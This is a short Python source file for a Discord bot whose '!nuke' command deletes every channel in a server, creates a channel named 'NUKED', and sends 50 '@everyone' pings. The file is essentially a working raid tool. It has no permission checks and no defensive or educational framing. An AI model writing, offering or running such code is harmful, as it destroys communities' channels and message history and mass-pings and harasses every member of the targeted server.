import discord, os
from discord.ext import commands

client = commands.Bot(command_prefix="!",intents=discord.Intents.all())

@client.command()
async def nuke(ctx):
  for channel in ctx.guild.channels:
    await channel.delete()
  newchannel = await ctx.guild.create_text_channel("NUKED")
  for i in range(0, 50):
    await newchannel.send("@everyone")


client.run(os.environ["token"])
